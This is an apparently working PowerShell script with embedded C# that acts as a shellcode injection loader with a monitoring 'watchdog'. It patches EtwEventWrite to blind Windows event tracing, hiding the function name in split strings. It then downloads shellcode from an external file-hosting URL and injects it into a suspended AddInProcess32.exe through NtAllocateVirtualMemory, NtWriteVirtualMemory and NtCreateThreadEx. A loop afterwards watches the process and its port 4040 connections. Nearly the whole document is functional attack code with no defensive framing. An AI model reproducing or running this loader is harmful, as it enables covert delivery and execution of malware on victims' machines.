#Requires -Version 5.1

$ShellcodeUrl = "https://files.catbox.moe/nfasiv.bin"

$code = @"
using System;
using System.Runtime.InteropServices;

public class Loader {
    [DllImport("kernel32.dll")]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesRead);

    [DllImport("ntdll.dll")]
    static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

    [DllImport("ntdll.dll")]
    static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    static extern uint NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, bool CreateSuspended, int StackZeroBits, int SizeOfStack, int MaximumStackSize, IntPtr AttributeList);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    public static string PatchETW() {
        IntPtr lib = LoadLibrary("nt" + "dll");
        IntPtr addr = GetProcAddress(lib, "Et" + "wEv" + "ent" + "Wr" + "ite");
        uint old;
        VirtualProtect(addr, (UIntPtr)1, 0x40, out old);
        Marshal.WriteByte(addr, 0xC3);
        return "ETW patched";
    }

    public static string Inject(string url) {
        try {
            PatchETW();
            Console.WriteLine("[+] ETW patched");

            Console.WriteLine("[*] Downloading shellcode...");
            byte[] payload;
            using (var client = new System.Net.WebClient()) {
                client.Headers.Add("User-Agent", "Mozilla/5.0");
                payload = client.DownloadData(url);
            }
            Console.WriteLine("[+] " + payload.Length + " bytes");

            string targetPath = Environment.GetEnvironmentVariable("windir") + @"\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe";
            Console.WriteLine("[*] Target: " + targetPath);

            Console.WriteLine("[*] Creating process (suspended)...");
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.dwFlags = 1;
            si.wShowWindow = 0;
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool ok = CreateProcess(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, 0x4 | 0x08000000, IntPtr.Zero, null, ref si, out pi);
            if (!ok) {
                return "CreateProcess failed: " + Marshal.GetLastWin32Error();
            }
            Console.WriteLine("[+] PID: " + pi.dwProcessId);

            IntPtr baseAddress = IntPtr.Zero;
            IntPtr size = (IntPtr)payload.Length;
            uint status = NtAllocateVirtualMemory(pi.hProcess, ref baseAddress, IntPtr.Zero, ref size, 0x3000, 0x40);
            if (status != 0) return "NtAllocateVirtualMemory failed: 0x" + status.ToString("X");
            Console.WriteLine("[+] Allocated at 0x" + baseAddress.ToString("X16"));

            uint bytesWritten;
            status = NtWriteVirtualMemory(pi.hProcess, baseAddress, payload, (uint)payload.Length, out bytesWritten);
            if (status != 0) return "NtWriteVirtualMemory failed: 0x" + status.ToString("X");
            Console.WriteLine("[+] Wrote " + bytesWritten + " bytes");

            IntPtr threadHandle;
            status = NtCreateThreadEx(out threadHandle, 0x1FFFFF, IntPtr.Zero, pi.hProcess, baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            if (status != 0) return "NtCreateThreadEx failed: 0x" + status.ToString("X");
            Console.WriteLine("[+] Shellcode thread running");

            Console.WriteLine("[!] Main thread suspended - process stays alive");
            return "SUCCESS|" + pi.dwProcessId;
        } catch (Exception ex) {
            return "Exception: " + ex.Message;
        }
    }
}
"@

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "  Injection Loader + Watchdog" -ForegroundColor Cyan
Write-Host "  $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan

Write-Host "[*] Compiling..." -ForegroundColor Yellow
try { Add-Type $code; Write-Host "[+] Compiled" -ForegroundColor Green }
catch { Write-Host "[-] Compile failed: $_" -ForegroundColor Red; exit 1 }

Write-Host "[*] Executing injection..." -ForegroundColor Yellow
$result = [Loader]::Inject($ShellcodeUrl)

if ($result -like "SUCCESS|*") {
    $parts = $result.Split("|")
    $targetPid = [int]$parts[1]

    Write-Host "[+] INJECTION SUCCESSFUL - PID: $targetPid" -ForegroundColor Green
    Write-Host ""

    # ========== WATCHDOG ==========
    Write-Host "========================================" -ForegroundColor Magenta
    Write-Host "  WATCHDOG - Monitoring shellcode" -ForegroundColor Magenta
    Write-Host "  PID: $targetPid" -ForegroundColor Magenta
    Write-Host "========================================`n" -ForegroundColor Magenta

    $preCPU = (Get-Process -Id $targetPid -EA SilentlyContinue).CPU
    $prevThreads = (Get-Process -Id $targetPid -EA SilentlyContinue).Threads.Count

    for ($i = 1; $i -le 300; $i++) {
        Start-Sleep -Seconds 2
        $ts = Get-Date -Format "HH:mm:ss"

        $p = Get-Process -Id $targetPid -EA SilentlyContinue
        if (-not $p) {
            Write-Host "[$ts] [!] PROCESS DIED" -ForegroundColor Red
            break
        }

        $cpu = [math]::Round($p.CPU - $preCPU, 4)
        $curThreads = $p.Threads.Count
        $threadDelta = $curThreads - $prevThreads

        $allConns = netstat -ano 2>$null | Select-String "ESTABLISHED"
        $port4040 = $allConns | Select-String ":4040"
        $targetConns = $allConns | Select-String "$targetPid"

        $color = "DarkGray"
        $status = "idle"
        if ($cpu -gt 0) { $color="Yellow"; $status="CPU +$cpu" }
        if ($threadDelta -ne 0) { $color="Yellow"; $status="threads $threadDelta" }

        Write-Host "[$ts] CPU:+$cpu | Threads:$curThreads (delta$threadDelta) | $status" -ForegroundColor $color

        if ($port4040) {
            Write-Host "[$ts] [!!!] PORT 4040:" -ForegroundColor Green
            $port4040 | ForEach-Object { Write-Host "  $_" -ForegroundColor Green }
        }

        if ($targetConns) {
            Write-Host "[$ts] [!] PID $targetPid connections:" -ForegroundColor Cyan
            $targetConns | ForEach-Object { Write-Host "  $_" -ForegroundColor Cyan }
        }

        $preCPU = $p.CPU
        $prevThreads = $curThreads
    }

    Write-Host "`n========================================" -ForegroundColor Cyan
    Write-Host "  END" -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan
} else {
    Write-Host "[-] FAILED: $result" -ForegroundColor Red
}